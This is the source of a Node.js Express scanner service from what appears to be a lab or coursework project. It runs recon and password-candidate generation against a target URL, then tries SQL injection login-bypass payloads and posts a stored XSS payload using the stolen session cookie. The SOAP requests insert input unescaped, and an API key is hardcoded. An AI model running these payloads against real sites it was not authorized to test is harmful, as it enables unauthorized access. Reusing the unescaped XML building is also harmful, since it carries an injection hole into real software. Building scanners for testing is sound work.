const express = require('express');
const axios = require('axios');
const { MongoClient } = require('mongodb');

const mongoClient = new MongoClient('mongodb://host.docker.internal:27017');
let scansCollection;

async function connectMongo() {
    await mongoClient.connect();
    const db = mongoClient.db('security_project');
    scansCollection = db.collection('scans');
    console.log('MongoDB connected');
}
connectMongo();

const app = express();
app.use(express.json());
const cors = require('cors');
app.use(cors());

const VALID_API_KEYS = ['secu-demo-key-2026'];

function checkApiKey(req, res, next) {
    const key = req.headers['x-api-key'];
    if (!key || !VALID_API_KEYS.includes(key)) {
        return res.status(401).json({ error: 'Missing or invalid API key' });
    }
    next();
}

app.use(checkApiKey);

// SQLi payloads to test
const sqliPayloads = [
    "' OR '1'='1' #",
    "' OR 1=1 #",
    "admin' --"
];

async function loginAndGetCookie(loginUrl) {
    const response = await axios.post(loginUrl,
        `email=${encodeURIComponent("' OR '1'='1' #")}&password=anything`,
        {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            maxRedirects: 0,
            validateStatus: () => true
        }
    );

    // extract the session cookie from response headers
    const cookie = response.headers['set-cookie'];
    return cookie ? cookie[0] : null;
}

async function getRecon(ip) {
    try {
        const response = await axios.get(`http://shodan-clone:8080/api/host/${ip}`, {
            headers: { 'X-API-Key': 'secu-demo-key-2026' },
            validateStatus: () => true
        });
        if (response.status === 200 && response.data) {
            return response.data;
        }
        return { found: false };
    } catch (err) {
        console.log('Recon failed:', err.message);
        return { found: false, error: err.message };
    }
}

const xml2js = require('xml2js');
const xmlParser = new xml2js.Parser({ explicitArray: true });

async function getPasswordCandidates(seed) {
    try {
        const soapBody = `<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <generate>
      <seed>${seed}</seed>
    </generate>
  </soap:Body>
</soap:Envelope>`;

        const response = await axios.post('http://password-guesser:5000/soap', soapBody, {
            headers: {
                'Content-Type': 'text/xml',
                'X-API-Key': 'secu-demo-key-2026'
            }
        });

        const parsed = await xmlParser.parseStringPromise(response.data);
        const candidates = parsed['soap:Envelope']['soap:Body'][0]['generateResponse'][0]['candidate'];
        return candidates || [];
    } catch (err) {
        console.log('Password guesser failed:', err.message);
        return [];
    }
}

async function getMinedWords(url) {
    try {
        const soapBody = `<?xml version="1.0" encoding="UTF-8"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
            <mine>
            <url>${url}</url>
            </mine>
        </soap:Body>
        </soap:Envelope>`;

        const response = await axios.post('http://password-guesser:5000/soap', soapBody, {
            headers: {
                'Content-Type': 'text/xml',
                'X-API-Key': 'secu-demo-key-2026'
            }
        });

        const parsed = await xmlParser.parseStringPromise(response.data);
        const words = parsed['soap:Envelope']['soap:Body'][0]['mineResponse'][0]['word'];
        return words || [];
    } catch (err) {
        console.log('Word mining failed:', err.message);
        return [];
    }
}

async function testXSS(baseUrl) {
    // baseUrl example: http://localhost:3000
    const loginUrl = `${baseUrl}/login`;
    const commentsUrl = `${baseUrl}/comments`;
    const xssPayload = "<script>alert('XSS')</script>";

    // step 1: login and get the cookie
    const cookie = await loginAndGetCookie(loginUrl);
    if (!cookie) {
        return { vulnerable: false, error: "Could not login" };
    }

    // step 2: post the XSS payload as a comment, using the cookie
    await axios.post(commentsUrl,
        `comment=${encodeURIComponent(xssPayload)}`,
        {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': cookie
            }
        }
    );

    // step 3: load the comments page and check if the payload is unescaped
    const pageResponse = await axios.get(commentsUrl, {
        headers: { 'Cookie': cookie }
    });

    const isVulnerable = pageResponse.data.includes(xssPayload);

    return {
        vulnerable: isVulnerable,
        payload: xssPayload,
        evidence: isVulnerable
            ? "Script tag found unescaped in page HTML"
            : "Script tag was escaped or not found"
    };
}

async function testSQLi(baseUrl) {
    const targetUrl = `${baseUrl}/login`;
    for (const payload of sqliPayloads) {
        try {
            const response = await axios.post(targetUrl,
                `email=${encodeURIComponent(payload)}&password=anything`,
                {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    maxRedirects: 0,
                    validateStatus: () => true // don't throw on any status code
                }
            );

            // if login succeeded, it usually redirects (302) to /comments
            if (response.status === 302 && response.headers.location === '/comments') {
                return {
                    vulnerable: true,
                    payload: payload,
                    evidence: `Redirected to /comments using payload: ${payload}`
                };
            }
        } catch (err) {
            console.log('Error testing payload:', payload, err.message);
        }
    }
    return { vulnerable: false };
}

// the SOA operation - this is your main "service"
app.post('/api/scan', async (req, res) => {
    const targetUrl = req.body.url;
    if (!targetUrl) {
        return res.status(400).json({ error: 'Missing url parameter' });
    }
    console.log('Scanning target:', targetUrl);

    const hostname = new URL(targetUrl).hostname;

    const recon = await getRecon(hostname);
    const minedWords = await getMinedWords(targetUrl);
    const seeds = minedWords.length > 0 ? minedWords.slice(0, 5) : ['admin'];

    let passwordCandidates = [];
    for (const seed of seeds) {
        const candidates = await getPasswordCandidates(seed);
        passwordCandidates = passwordCandidates.concat(candidates);
    }
    passwordCandidates = [...new Set(passwordCandidates)];

    const sqliResult = await testSQLi(targetUrl);
    const xssResult = await testXSS(targetUrl);

    const scanReport = {
        target: targetUrl,
        timestamp: new Date().toISOString(),
        recon: recon,
        minedWords: minedWords,
        passwordCandidates: passwordCandidates,
        results: {
            sqli: sqliResult,
            xss: xssResult
        }
    };

    await scansCollection.insertOne(scanReport);

    res.json(scanReport);
});

app.get('/api/history', async (req, res) => {
    const allScans = await scansCollection.find().toArray();
    res.json(allScans);
});

app.listen(3002, () => {
    console.log('Scanner service running on http://localhost:3002');
});